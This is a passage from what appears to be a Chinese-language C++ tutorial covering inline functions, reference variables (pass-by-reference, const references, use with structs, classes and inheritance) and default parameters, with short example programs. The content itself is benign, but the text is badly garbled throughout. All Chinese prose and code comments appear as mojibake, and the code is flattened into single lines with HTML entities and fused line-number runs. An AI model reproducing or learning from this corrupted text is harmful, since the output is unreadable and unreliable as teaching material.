éµå¾ªä½œç”¨åŸŸ: å†…è”å‡½æ•°éµå¾ª C++ çš„ä½œç”¨åŸŸå’Œè®¿é—®è§„åˆ™ã€‚ å› æ­¤ï¼Œåœ¨ C++ ä¸­ï¼Œåº”ä¼˜å…ˆä½¿ç”¨å†…è”å‡½æ•°è€Œä¸æ˜¯å¸¦å‚æ•°çš„å®æ¥å®ç°ç®€å•çš„ã€éœ€è¦é¿å…è°ƒç”¨å¼€é”€çš„åŠŸèƒ½ã€‚ æ€»ç»“: å†…è”å‡½æ•°æ˜¯ C++ æä¾›çš„ä¸€ç§æ€§èƒ½ä¼˜åŒ–å»ºè®®ï¼Œé€šè¿‡åœ¨ç¼–è¯‘æ—¶å°†å‡½æ•°ä»£ç æ›¿æ¢åˆ°è°ƒç”¨ç‚¹æ¥å‡å°‘å‡½æ•°è°ƒç”¨å¼€é”€ã€‚å®ƒç‰¹åˆ«é€‚ç”¨äºçŸ­å°ä¸”é¢‘ç¹è°ƒç”¨çš„å‡½æ•°ã€‚inline å…³é”®å­—åªæ˜¯ä¸€ä¸ªå»ºè®®ï¼Œç¼–è¯‘å™¨æœ‰æœ€ç»ˆå†³å®šæƒã€‚ä¸ºäº†ä½¿å†…è”æˆä¸ºå¯èƒ½ï¼Œé€šå¸¸éœ€è¦å°†å†…è”å‡½æ•°çš„å®šä¹‰æ”¾åœ¨å¤´æ–‡ä»¶ä¸­ã€‚ç›¸æ¯” C é£æ ¼çš„å®ï¼Œå†…è”å‡½æ•°æä¾›äº†ç±»å‹å®‰å…¨å’Œæ›´å¯é¢„æµ‹çš„è¡Œä¸ºã€‚ 8.2 å¼•ç”¨å˜é‡C++ å¼•å…¥äº†ä¸€ç§æ–°çš„å¤åˆç±»å‹â€”â€”å¼•ç”¨ (Reference)**ã€‚å¼•ç”¨æ˜¯å·²å®šä¹‰å˜é‡çš„åˆ«å (alias)**ã€‚å®ƒæä¾›äº†ä¸€ç§é—´æ¥è®¿é—®å˜é‡çš„æ–¹å¼ï¼Œä½†è¯­æ³•æ¯”æŒ‡é’ˆæ›´ç®€æ´ã€‚ä¸€æ—¦å¼•ç”¨è¢«åˆå§‹åŒ–æŒ‡å‘ä¸€ä¸ªå˜é‡ï¼Œå®ƒå°±ä¸èƒ½å†å¼•ç”¨å…¶ä»–å˜é‡ï¼Œå¹¶ä¸”å¯¹å¼•ç”¨çš„æ‰€æœ‰æ“ä½œå®é™…ä¸Šéƒ½ä½œç”¨äºå®ƒæ‰€å¼•ç”¨çš„åŸå§‹å˜é‡ã€‚ 8.2.1 åˆ›å»ºå¼•ç”¨å˜é‡å¼•ç”¨å˜é‡åœ¨å£°æ˜æ—¶å¿…é¡»è¢«åˆå§‹åŒ–ï¼Œå¹¶ä¸”å…¶ç±»å‹å¿…é¡»ä¸å®ƒæ‰€å¼•ç”¨çš„å˜é‡ç±»å‹ç›¸åŒ¹é…ã€‚ è¯­æ³•: 1type&amp; reference_name = existing_variable; type: å˜é‡çš„ç±»å‹ã€‚ &amp;: å¼•ç”¨å£°æ˜ç¬¦ï¼Œç´§è·Ÿåœ¨ç±»å‹åä¹‹åã€‚ reference_name: å¼•ç”¨çš„åç§°ã€‚ existing_variable: å¼•ç”¨æ‰€æŒ‡å‘çš„å·²å­˜åœ¨çš„å˜é‡ã€‚ ç¤ºä¾‹: 123456789101112131415161718192021222324#include &lt;iostream&gt;int main() &#123; int rats = 101; int&amp; rodents = rats; // rodents æ˜¯ rats çš„ä¸€ä¸ªå¼•ç”¨ (åˆ«å) std::cout &lt;&lt; &quot;rats = &quot; &lt;&lt; rats; std::cout &lt;&lt; &quot;, rodents = &quot; &lt;&lt; rodents &lt;&lt; std::endl; // è¾“å‡º: rats = 101, rodents = 101 // å¯¹å¼•ç”¨è¿›è¡Œæ“ä½œï¼Œå®é™…ä¸Šæ˜¯æ“ä½œåŸå§‹å˜é‡ rodents++; std::cout &lt;&lt; &quot;After rodents++:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;rats = &quot; &lt;&lt; rats; // rats çš„å€¼ä¹Ÿå˜æˆäº† 102 std::cout &lt;&lt; &quot;, rodents = &quot; &lt;&lt; rodents &lt;&lt; std::endl; // è¾“å‡º: rats = 102, rodents = 102 // æŸ¥çœ‹åœ°å€ï¼Œä¼šå‘ç°å®ƒä»¬æ˜¯ç›¸åŒçš„ std::cout &lt;&lt; &quot;Address of rats: &quot; &lt;&lt; &amp;rats &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Address of rodents: &quot; &lt;&lt; &amp;rodents &lt;&lt; std::endl; // è¾“å‡ºç›¸åŒçš„åœ°å€ // int&amp; bad_ref; // é”™è¯¯ï¼å¼•ç”¨å¿…é¡»åœ¨å£°æ˜æ—¶åˆå§‹åŒ– // double&amp; wrong_type = rats; // é”™è¯¯ï¼ç±»å‹ä¸åŒ¹é… (double&amp; vs int) return 0;&#125; å…³é”®ç‚¹: å¼•ç”¨å¿…é¡»åœ¨å£°æ˜æ—¶åˆå§‹åŒ–ã€‚ å¼•ç”¨ä¸€æ—¦åˆå§‹åŒ–ï¼Œå°±ä¸èƒ½å†æŒ‡å‘å…¶ä»–å˜é‡ã€‚å®ƒç»ˆç”Ÿéƒ½æ˜¯å…¶åˆå§‹å˜é‡çš„åˆ«åã€‚ å¼•ç”¨æœ¬èº«ä¸å ç”¨ç‹¬ç«‹çš„å†…å­˜åœ°å€ï¼ˆæˆ–è€…è¯´ï¼Œå®ƒçš„åœ°å€å°±æ˜¯å®ƒæ‰€å¼•ç”¨å˜é‡çš„åœ°å€ï¼‰ã€‚ 8.2.2 å°†å¼•ç”¨ç”¨ä½œå‡½æ•°å‚æ•°å¼•ç”¨æœ€é‡è¦å’Œæœ€å¸¸è§çš„ç”¨é€”ä¹‹ä¸€æ˜¯ä½œä¸ºå‡½æ•°å‚æ•°ï¼Œè¿™ç§°ä¸º**æŒ‰å¼•ç”¨ä¼ é€’ (Pass by Reference)**ã€‚å½“ä½¿ç”¨å¼•ç”¨ä½œä¸ºå‡½æ•°å‚æ•°æ—¶ï¼Œå‡½æ•°æ¥æ”¶çš„æ˜¯åŸå§‹å˜é‡çš„åˆ«åï¼Œè€Œä¸æ˜¯å‰¯æœ¬ã€‚è¿™æ„å‘³ç€å‡½æ•°å¯ä»¥ç›´æ¥è®¿é—®å¹¶ä¿®æ”¹è°ƒç”¨è€…ä½œç”¨åŸŸä¸­çš„åŸå§‹å˜é‡ã€‚ è¯­æ³•: 123void function_name(type&amp; ref_parameter) &#123; // å¯ä»¥é€šè¿‡ ref_parameter ä¿®æ”¹åŸå§‹å®å‚&#125; ç¤ºä¾‹ï¼šä½¿ç”¨å¼•ç”¨å‚æ•°äº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;// å‡½æ•°ï¼šä½¿ç”¨å¼•ç”¨å‚æ•°äº¤æ¢ä¸¤ä¸ª int å˜é‡çš„å€¼void swap_ref(int&amp; a, int&amp; b) &#123; // a å’Œ b æ˜¯è°ƒç”¨æ—¶ä¼ å…¥å˜é‡çš„åˆ«å int temp = a; a = b; b = temp; // å¯¹ a å’Œ b çš„ä¿®æ”¹ç›´æ¥å½±å“åŸå§‹å˜é‡&#125;// å¯¹æ¯”ï¼šä½¿ç”¨æŒ‡é’ˆå‚æ•°äº¤æ¢ (ä¼ ç»Ÿ C é£æ ¼)void swap_ptr(int* p_a, int* p_b) &#123; int temp = *p_a; *p_a = *p_b; *p_b = temp;&#125;// å¯¹æ¯”ï¼šä½¿ç”¨å€¼ä¼ é€’ (æ— æ³•äº¤æ¢åŸå§‹å˜é‡)void swap_val(int a, int b) &#123; int temp = a; a = b; b = temp; // åªä¿®æ”¹äº†å±€éƒ¨å‰¯æœ¬ a å’Œ b&#125;int main() &#123; int wallet1 = 100; int wallet2 = 200; std::cout &lt;&lt; &quot;Original: wallet1 = &quot; &lt;&lt; wallet1 &lt;&lt; &quot;, wallet2 = &quot; &lt;&lt; wallet2 &lt;&lt; std::endl; // å°è¯•ä½¿ç”¨å€¼ä¼ é€’äº¤æ¢ (å¤±è´¥) swap_val(wallet1, wallet2); std::cout &lt;&lt; &quot;After swap_val: wallet1 = &quot; &lt;&lt; wallet1 &lt;&lt; &quot;, wallet2 = &quot; &lt;&lt; wallet2 &lt;&lt; std::endl; // å€¼ä¸å˜ // ä½¿ç”¨å¼•ç”¨ä¼ é€’äº¤æ¢ (æˆåŠŸ) swap_ref(wallet1, wallet2); std::cout &lt;&lt; &quot;After swap_ref: wallet1 = &quot; &lt;&lt; wallet1 &lt;&lt; &quot;, wallet2 = &quot; &lt;&lt; wallet2 &lt;&lt; std::endl; // å€¼å·²äº¤æ¢ // å†æ¬¡äº¤æ¢å›æ¥ï¼Œä½¿ç”¨æŒ‡é’ˆä¼ é€’ (æˆåŠŸ) swap_ptr(&amp;wallet1, &amp;wallet2); // æ³¨æ„éœ€è¦ä¼ é€’åœ°å€ std::cout &lt;&lt; &quot;After swap_ptr: wallet1 = &quot; &lt;&lt; wallet1 &lt;&lt; &quot;, wallet2 = &quot; &lt;&lt; wallet2 &lt;&lt; std::endl; // å€¼å†æ¬¡äº¤æ¢å›æ¥ return 0;&#125; æŒ‰å¼•ç”¨ä¼ é€’ vs. æŒ‰æŒ‡é’ˆä¼ é€’: è¯­æ³•: å¼•ç”¨ä¼ é€’çš„è°ƒç”¨è¯­æ³•æ›´ç®€æ´è‡ªç„¶ (swap_ref(a, b))ï¼Œè€ŒæŒ‡é’ˆä¼ é€’éœ€è¦æ˜¾å¼è·å–åœ°å€ (swap_ptr(&amp;a, &amp;b)) å¹¶åœ¨å‡½æ•°å†…éƒ¨è§£å¼•ç”¨ (*p_a)ã€‚ ç©ºå€¼: æŒ‡é’ˆå¯ä»¥ä¸º nullptrï¼Œéœ€è¦åœ¨ä½¿ç”¨å‰æ£€æŸ¥ã€‚å¼•ç”¨é€šå¸¸ï¼ˆåœ¨æ ‡å‡†ç”¨æ³•ä¸‹ï¼‰ä¸ä¼šæ˜¯â€œç©ºâ€çš„ï¼Œå› ä¸ºå®ƒå¿…é¡»å¼•ç”¨ä¸€ä¸ªå·²å­˜åœ¨çš„å¯¹è±¡ã€‚è¿™ä½¿å¾—å¼•ç”¨åœ¨æŸäº›æƒ…å†µä¸‹æ›´å®‰å…¨ã€‚ ç›®çš„: ä¸¤è€…éƒ½å¯ä»¥ç”¨æ¥å…è®¸å‡½æ•°ä¿®æ”¹è°ƒç”¨è€…çš„å˜é‡ï¼Œä»¥åŠé¿å…å¤§å‹å¯¹è±¡çš„å¤åˆ¶å¼€é”€ã€‚ 8.2.3 å¼•ç”¨çš„å±æ€§å’Œç‰¹åˆ«ä¹‹å¤„ å¿…é¡»åˆå§‹åŒ–: å¦‚å‰æ‰€è¿°ï¼Œå¼•ç”¨åœ¨å£°æ˜æ—¶å¿…é¡»ç»‘å®šåˆ°ä¸€ä¸ªå·²å­˜åœ¨çš„å¯¹è±¡ã€‚ ä¸å¯é‡æ–°ç»‘å®š: å¼•ç”¨ä¸èƒ½åœ¨åˆå§‹åŒ–åæ›´æ”¹å…¶å¼•ç”¨çš„å¯¹è±¡ã€‚ è¡Œä¸ºåƒåŸå˜é‡: å¯¹å¼•ç”¨çš„æ“ä½œï¼ˆèµ‹å€¼ã€å–åœ°å€ç­‰ï¼‰é€šå¸¸è¡¨ç°å¾—å°±åƒç›´æ¥å¯¹åŸå§‹å˜é‡æ“ä½œä¸€æ ·ã€‚ ä¸´æ—¶å˜é‡å’Œ const å¼•ç”¨: é€šå¸¸ï¼Œä¸èƒ½å°†å¼•ç”¨ç»‘å®šåˆ°ä¸´æ—¶å˜é‡æˆ–å­—é¢å€¼ã€‚ä½†æœ‰ä¸€ä¸ªé‡è¦çš„ä¾‹å¤–ï¼šå¸¸é‡å¼•ç”¨ (const type&amp;) å¯ä»¥ç»‘å®šåˆ°ä¸´æ—¶å˜é‡ã€å­—é¢å€¼æˆ–ç±»å‹ç¨æœ‰ä¸åŒçš„å˜é‡ï¼ˆå¦‚æœå¯ä»¥è¿›è¡Œéšå¼è½¬æ¢ï¼‰ã€‚ 12345678double value = 3.14;// int&amp; ref_val = value; // é”™è¯¯ï¼šç±»å‹ä¸åŒ¹é…const int&amp; const_ref_val = value; // åˆæ³•ï¼åˆ›å»ºäº†ä¸€ä¸ªä¸´æ—¶çš„ int(3)ï¼Œconst_ref_val å¼•ç”¨è¿™ä¸ªä¸´æ—¶å˜é‡const double&amp; ref_literal = 5.0 * 2.0; // åˆæ³•ï¼å¼•ç”¨ä¸€ä¸ªä¸´æ—¶ double(10.0)long num = 100L;const int&amp; ref_num = num; // åˆæ³•ï¼å¼•ç”¨ä¸€ä¸ªä¸´æ—¶çš„ int(100) è¿™ç§ç‰¹æ€§ä½¿å¾—å¸¸é‡å¼•ç”¨åœ¨å‡½æ•°å‚æ•°ä¸­éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒä»¬å¯ä»¥æ¥å—æ›´å¹¿æ³›çš„å®å‚ç±»å‹ï¼ˆåŒ…æ‹¬å­—é¢å€¼å’Œéœ€è¦ç±»å‹è½¬æ¢çš„å€¼ï¼‰ï¼ŒåŒæ—¶ä¿è¯å‡½æ•°ä¸ä¼šä¿®æ”¹å®ƒä»¬ã€‚ 8.2.4 å°†å¼•ç”¨ç”¨äºç»“æ„æŒ‰å¼•ç”¨ä¼ é€’å¯¹äºç»“æ„ä½“ç‰¹åˆ«æœ‰ç”¨ï¼Œå› ä¸ºå®ƒå¯ä»¥é¿å…å¤åˆ¶æ•´ä¸ªç»“æ„ä½“ï¼ˆå¯èƒ½åŒ…å«è®¸å¤šæˆå‘˜ï¼‰çš„å¼€é”€ã€‚å¦‚æœå‡½æ•°ä¸éœ€è¦ä¿®æ”¹ç»“æ„ä½“ï¼Œåº”ä½¿ç”¨å¸¸é‡å¼•ç”¨ (const struct_type&amp;)ã€‚ 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;string&gt;struct Product &#123; std::string name; double price; int quantity;&#125;;// æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ç»“æ„ï¼Œé¿å…å¤åˆ¶ä¸”ä¸ä¿®æ”¹void display_product(const Product&amp; prod) &#123; std::cout &lt;&lt; &quot;Product Name: &quot; &lt;&lt; prod.name &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Price: $&quot; &lt;&lt; prod.price &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Quantity: &quot; &lt;&lt; prod.quantity &lt;&lt; std::endl; // prod.price = 0.0; // é”™è¯¯ï¼ä¸èƒ½é€šè¿‡ const å¼•ç”¨ä¿®æ”¹&#125;// æŒ‰å¼•ç”¨ä¼ é€’ç»“æ„ï¼Œå…è®¸ä¿®æ”¹void apply_discount(Product&amp; prod, double discount_percentage) &#123; if (discount_percentage &gt; 0 &amp;&amp; discount_percentage &lt; 100) &#123; prod.price *= (1.0 - discount_percentage / 100.0); &#125;&#125;int main() &#123; Product laptop = &#123;&quot;Laptop Pro&quot;, 1200.0, 10&#125;; std::cout &lt;&lt; &quot;--- Initial Product ---&quot; &lt;&lt; std::endl; display_product(laptop); // é«˜æ•ˆä¼ é€’ï¼Œä¸å¤åˆ¶ apply_discount(laptop, 10.0); // ä¼ é€’å¼•ç”¨ä»¥ä¿®æ”¹ä»·æ ¼ std::cout &lt;&lt; &quot;\\n--- Product After 10% Discount ---&quot; &lt;&lt; std::endl; display_product(laptop); // å†æ¬¡é«˜æ•ˆä¼ é€’ return 0;&#125; 8.2.5 å°†å¼•ç”¨ç”¨äºç±»å¯¹è±¡å°†å¼•ç”¨ç”¨äºç±»å¯¹è±¡ä¸ç”¨äºç»“æ„ä½“å®Œå…¨ç›¸åŒã€‚æŒ‰å¸¸é‡å¼•ç”¨ (const class_type&amp;) ä¼ é€’æ˜¯é¿å…å¤åˆ¶å¤§å‹å¯¹è±¡å¹¶ç¡®ä¿å‡½æ•°ä¸ä¿®æ”¹å¯¹è±¡çŠ¶æ€çš„æ ‡å‡†åšæ³•ã€‚å¦‚æœéœ€è¦ä¿®æ”¹å¯¹è±¡ï¼Œåˆ™ä½¿ç”¨æ™®é€šå¼•ç”¨ (class_type&amp;)ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;class Student &#123;public: Student(const std::string&amp; n) : name(n) &#123;&#125; void add_grade(int g) &#123; grades.push_back(g); &#125; void print_info() const &#123; // const æˆå‘˜å‡½æ•° std::cout &lt;&lt; &quot;Student: &quot; &lt;&lt; name &lt;&lt; &quot;, Grades: &quot;; for (int g : grades) &#123; std::cout &lt;&lt; g &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; &#125; const std::string&amp; get_name() const &#123; return name; &#125; // è¿”å›å¸¸é‡å¼•ç”¨private: std::string name; std::vector&lt;int&gt; grades;&#125;;// æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ç±»å¯¹è±¡void show_student_summary(const Student&amp; s) &#123; std::cout &lt;&lt; &quot;Summary for &quot; &lt;&lt; s.get_name() &lt;&lt; std::endl; s.print_info(); // å¯ä»¥è°ƒç”¨ const æˆå‘˜å‡½æ•° // s.add_grade(100); // é”™è¯¯ï¼ä¸èƒ½é€šè¿‡ const å¼•ç”¨è°ƒç”¨é const æˆå‘˜å‡½æ•°&#125;int main() &#123; Student alice(&quot;Alice&quot;); alice.add_grade(95); alice.add_grade(88); show_student_summary(alice); // é«˜æ•ˆä¼ é€’ï¼Œä¸å¤åˆ¶ return 0;&#125; 8.2.6 å¯¹è±¡ã€ç»§æ‰¿å’Œå¼•ç”¨å½“ä¸ç±»ç»§æ‰¿ç»“åˆä½¿ç”¨æ—¶ï¼ŒåŸºç±»çš„å¼•ç”¨å¯ä»¥æŒ‡å‘æ´¾ç”Ÿç±»çš„å¯¹è±¡ã€‚è¿™æ˜¯å®ç°å¤šæ€ (Polymorphism) çš„å…³é”®æœºåˆ¶ä¹‹ä¸€ï¼ˆä¸æŒ‡é’ˆç±»ä¼¼ï¼‰ã€‚é€šè¿‡åŸºç±»å¼•ç”¨è°ƒç”¨è™šå‡½æ•°æ—¶ï¼Œä¼šæ‰§è¡Œæ´¾ç”Ÿç±»ä¸­ç›¸åº”çš„ç‰ˆæœ¬ã€‚è¿™éƒ¨åˆ†å†…å®¹å°†åœ¨åç»­ç« èŠ‚ï¼ˆå¦‚ç¬¬ 13 ç« ï¼‰è¯¦ç»†ä»‹ç»ã€‚ 12345678910111213141516171819202122232425// æ¦‚å¿µé¢„è§ˆ (å°†åœ¨åç»­ç« èŠ‚è¯¦ç»†è®²è§£)class Base &#123;public: virtual void show() const &#123; std::cout &lt;&lt; &quot;Base::show()&quot; &lt;&lt; std::endl; &#125; virtual ~Base() &#123;&#125; // è™šææ„å‡½æ•°&#125;;class Derived : public Base &#123;public: void show() const override &#123; std::cout &lt;&lt; &quot;Derived::show()&quot; &lt;&lt; std::endl; &#125;&#125;;void display(const Base&amp; obj) &#123; // å‚æ•°æ˜¯åŸºç±»çš„å¸¸é‡å¼•ç”¨ obj.show(); // è°ƒç”¨è™šå‡½æ•°ï¼Œä¼šæ ¹æ® obj å®é™…å¼•ç”¨çš„å¯¹è±¡ç±»å‹æ‰§è¡Œç›¸åº”ç‰ˆæœ¬&#125;int main() &#123; Base b; Derived d; display(b); // è¾“å‡º: Base::show() display(d); // è¾“å‡º: Derived::show() (å¤šæ€è¡Œä¸º) return 0;&#125; 8.2.7 ä½•æ—¶ä½¿ç”¨å¼•ç”¨å‚æ•°é€‰æ‹©ä½¿ç”¨å€¼ä¼ é€’ã€æŒ‡é’ˆä¼ é€’è¿˜æ˜¯å¼•ç”¨ä¼ é€’å–å†³äºå…·ä½“éœ€æ±‚ï¼š æŒ‰å€¼ä¼ é€’ (type param): é€‚ç”¨äºå°å‹æ•°æ®ç±»å‹ï¼ˆint, double, bool, æŒ‡é’ˆæœ¬èº«ï¼‰ã€‚ å½“å‡½æ•°éœ€è¦æ“ä½œæ•°æ®çš„å‰¯æœ¬è€Œä¸å½±å“åŸå§‹æ•°æ®æ—¶ã€‚ ç®€å•æ˜“æ‡‚ã€‚ æŒ‰æŒ‡é’ˆä¼ é€’ (type* param): å½“å‡½æ•°éœ€è¦ä¿®æ”¹è°ƒç”¨è€…çš„åŸå§‹æ•°æ®æ—¶ï¼ˆä¼ ç»Ÿ C é£æ ¼ï¼‰ã€‚ å½“éœ€è¦è¡¨ç¤ºâ€œå¯é€‰â€å‚æ•°ï¼ˆå¯ä»¥ä¼ é€’ nullptrï¼‰æ—¶ã€‚ ä¸ C åº“æˆ–æ—§ä»£ç äº¤äº’æ—¶ã€‚ ä¼ é€’å¤§å‹å¯¹è±¡ä»¥é¿å…å¤åˆ¶å¼€é”€ï¼ˆä½†é€šå¸¸å¼•ç”¨æ›´å—æ¬¢è¿ï¼‰ã€‚ æŒ‰å¼•ç”¨ä¼ é€’ (type&amp; param): å½“å‡½æ•°éœ€è¦ä¿®æ”¹è°ƒç”¨è€…çš„åŸå§‹æ•°æ®æ—¶ï¼ˆC++ é£æ ¼ï¼Œé€šå¸¸æ¯”æŒ‡é’ˆæ›´ç®€æ´å®‰å…¨ï¼‰ã€‚ ä¼ é€’å¤§å‹å¯¹è±¡ï¼ˆç»“æ„ã€ç±»ï¼‰ä»¥é¿å…å¤åˆ¶å¼€é”€ï¼Œä½†å‡½æ•°ä¸éœ€è¦ä¿®æ”¹å¯¹è±¡æ—¶ï¼Œåº”ä½¿ç”¨**å¸¸é‡å¼•ç”¨ (const type&amp; param)**ã€‚è¿™æ˜¯ C++ ä¸­éå¸¸å¸¸è§çš„åšæ³•ï¼Œå…¼å…·æ•ˆç‡å’Œå®‰å…¨æ€§ã€‚ ç»éªŒæ³•åˆ™: å¯¹äºå†…ç½®ç±»å‹å’Œå°å‹ç»“æ„ï¼Œä¼˜å…ˆè€ƒè™‘æŒ‰å€¼ä¼ é€’ã€‚ å¯¹äºéœ€è¦ä¿®æ”¹è°ƒç”¨è€…æ•°æ®çš„å¤§å‹å¯¹è±¡æˆ–å‡½æ•°ï¼Œä½¿ç”¨æŒ‰å¼•ç”¨ä¼ é€’ (type&amp;)ã€‚ å¯¹äºä¸éœ€è¦ä¿®æ”¹è°ƒç”¨è€…æ•°æ®çš„å¤§å‹å¯¹è±¡ï¼Œä½¿ç”¨æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ (const type&amp;) ä»¥æé«˜æ•ˆç‡å’Œå®‰å…¨æ€§ã€‚ åœ¨éœ€è¦è¡¨ç¤ºå¯é€‰å‚æ•°æˆ–ä¸ C é£æ ¼ä»£ç äº¤äº’æ—¶ï¼Œè€ƒè™‘ä½¿ç”¨æŒ‰æŒ‡é’ˆä¼ é€’ (type*)ã€‚ å¼•ç”¨æ˜¯ C++ ä¸­ä¸€ä¸ªå¼ºå¤§ä¸”å¸¸ç”¨çš„ç‰¹æ€§ï¼Œå°¤å…¶æ˜¯åœ¨å‡½æ•°å‚æ•°å’Œè¿”å›å€¼ä¸­ï¼Œå®ƒæä¾›äº†æŒ‡é’ˆä¹‹å¤–çš„å¦ä¸€ç§å¤„ç†é—´æ¥è®¿é—®å’Œé¿å…å¤åˆ¶çš„æ–¹å¼ã€‚ 8.3 é»˜è®¤å‚æ•°C++ å…è®¸åœ¨å‡½æ•°å£°æ˜ï¼ˆåŸå‹ï¼‰æˆ–å®šä¹‰ä¸­ä¸ºå‡½æ•°çš„å‚æ•°æŒ‡å®šé»˜è®¤å€¼ã€‚å¦‚æœåœ¨è°ƒç”¨å‡½æ•°æ—¶æ²¡æœ‰ä¸ºå¸¦æœ‰é»˜è®¤å€¼çš„å‚æ•°æä¾›å®å‚ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ä½¿ç”¨è¯¥å‚æ•°çš„é»˜è®¤å€¼ã€‚å¦‚æœæä¾›äº†å®å‚ï¼Œåˆ™ä½¿ç”¨æä¾›çš„å®å‚å€¼ï¼Œè¦†ç›–é»˜è®¤å€¼ã€‚ ç›®çš„: æé«˜å‡½æ•°çš„çµæ´»æ€§ï¼Œå…è®¸ç”¨æˆ·åœ¨è°ƒç”¨æ—¶çœç•¥æŸäº›ä¸å¸¸ç”¨çš„å‚æ•°ã€‚ ç®€åŒ–å‡½æ•°è°ƒç”¨ï¼Œç‰¹åˆ«æ˜¯å½“æŸäº›å‚æ•°åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹éƒ½ä½¿ç”¨ç›¸åŒçš„å€¼æ—¶ã€‚ ç”¨æ³•åœ¨å‡½æ•°åŸå‹æˆ–å®šä¹‰ä¸­ï¼Œé€šè¿‡åœ¨å‚æ•°å£°æ˜åä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦ = æ¥æŒ‡å®šé»˜è®¤å€¼ã€‚ è¯­æ³• (åœ¨åŸå‹ä¸­æŒ‡å®š): 1return_type function_name(type param1, type param2 = default_value2, type param3 = default_value3); é‡è¦è§„åˆ™: ä»å³åˆ°å·¦è§„åˆ™: å¿…é¡»ä¸ºå‡½æ•°å‚æ•°åˆ—è¡¨ä»å³åˆ°å·¦ä¾æ¬¡æä¾›é»˜è®¤å€¼ã€‚å¦‚æœæŸä¸ªå‚æ•°æœ‰é»˜è®¤å€¼ï¼Œåˆ™å…¶å³ä¾§çš„æ‰€æœ‰å‚æ•°å¿…é¡»ä¹Ÿæœ‰é»˜è®¤å€¼ã€‚ 123456// åˆæ³•void func1(int a, int b = 10, int c = 20);// åˆæ³•void func2(int a = 5, int b = 10, int c = 20);// éæ³•ï¼å¦‚æœ b æœ‰é»˜è®¤å€¼ï¼Œc å¿…é¡»ä¹Ÿæœ‰// void func_error(int a, int b = 10, int c); åŸå‹ vs. å®šä¹‰: é»˜è®¤å‚æ•°å€¼é€šå¸¸åœ¨å‡½æ•°åŸå‹ï¼ˆå£°æ˜ï¼‰ä¸­æŒ‡å®šï¼Œè€Œä¸æ˜¯åœ¨å‡½æ•°å®šä¹‰ä¸­ã€‚å¦‚æœåœ¨åŸå‹ä¸­æŒ‡å®šäº†é»˜è®¤å€¼ï¼Œåˆ™å®šä¹‰ä¸­ä¸èƒ½å†æ¬¡æŒ‡å®šã€‚å¦‚æœå‡½æ•°æ²¡æœ‰å•ç‹¬çš„åŸå‹ï¼ˆå®šä¹‰åœ¨è°ƒç”¨ä¹‹å‰ï¼‰ï¼Œåˆ™å¯ä»¥åœ¨å®šä¹‰ä¸­æŒ‡å®šé»˜è®¤å€¼ã€‚å°†é»˜è®¤å€¼æ”¾åœ¨åŸå‹ä¸­ï¼ˆé€šå¸¸åœ¨å¤´æ–‡ä»¶é‡Œï¼‰æ˜¯æ›´å¥½çš„åšæ³•ï¼Œå› ä¸ºå®ƒå‘è°ƒç”¨è€…æ¸…æ™°åœ°å±•ç¤ºäº†å¯ä»¥çœç•¥å“ªäº›å‚æ•°ã€‚ è°ƒç”¨æ—¶çš„åŒ¹é…: è°ƒç”¨å‡½æ•°æ—¶ï¼Œæä¾›çš„å®å‚ä¼šä»å·¦åˆ°å³åŒ¹é…å‚æ•°ã€‚ä¸èƒ½è·³è¿‡æ²¡æœ‰é»˜è®¤å€¼çš„å‚æ•°å»ä¸ºæœ‰é»˜è®¤å€¼çš„å‚æ•°æä¾›å€¼ã€‚ 1234func1(1); // ç­‰æ•ˆäº func1(1, 10, 20)func1(1, 50); // ç­‰æ•ˆäº func1(1, 50, 20)func1(1, 50, 30); // ç­‰æ•ˆäº func1(1, 50, 30)// func1(1, , 30); // éæ³•ï¼ä¸èƒ½è·³è¿‡å‚æ•° b ç¤ºä¾‹1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;string&gt;// å‡½æ•°åŸå‹ï¼ŒæŒ‡å®šé»˜è®¤å‚æ•°// level é»˜è®¤ä¸º 1ï¼Œ prefix é»˜è®¤ä¸º &quot;Log: &quot;void log_message(const std::string&amp; message, int level = 1, const std::string&amp; prefix = &quot;Log: &quot;);int main() &#123; // è°ƒç”¨æ–¹å¼ 1: æä¾›æ‰€æœ‰å‚æ•° log_message(&quot;System started.&quot;, 0, &quot;Info: &quot;); // è°ƒç”¨æ–¹å¼ 2: çœç•¥æœ€å³è¾¹çš„ prefix å‚æ•°ï¼Œä½¿ç”¨å…¶é»˜è®¤å€¼ log_message(&quot;Processing data...&quot;, 2); // prefix ä½¿ç”¨ &quot;Log: &quot; // è°ƒç”¨æ–¹å¼ 3: çœç•¥ level å’Œ prefix å‚æ•°ï¼Œä½¿ç”¨å®ƒä»¬çš„é»˜è®¤å€¼ log_message(&quot;Operation complete.&quot;); // level ä½¿ç”¨ 1, prefix ä½¿ç”¨ &quot;Log: &quot; // log_message(&quot;Error occurred&quot;, , &quot;Error: &quot;); // éæ³•ï¼ä¸èƒ½è·³è¿‡ level return 0;&#125;// å‡½æ•°å®šä¹‰ (æ³¨æ„ï¼šè¿™é‡Œä¸å†é‡å¤é»˜è®¤å€¼)void log_message(const std::string&amp; message, int level, const std::string&amp; prefix) &#123; std::cout &lt;&lt; prefix &lt;&lt; &quot;[Level &quot; &lt;&lt; level &lt;&lt; &quot;] &quot; &lt;&lt; message &lt;&lt; std::endl;&#125; è¾“å‡º: 123Info: [Level 0] System started.Log: [Level 2] Processing data...Log: [Level 1] Operation complete. ä»£ç è§£é‡Š: log_message å‡½æ•°çš„åŸå‹ä¸º level å’Œ prefix å‚æ•°æŒ‡å®šäº†é»˜è®¤å€¼ã€‚ main 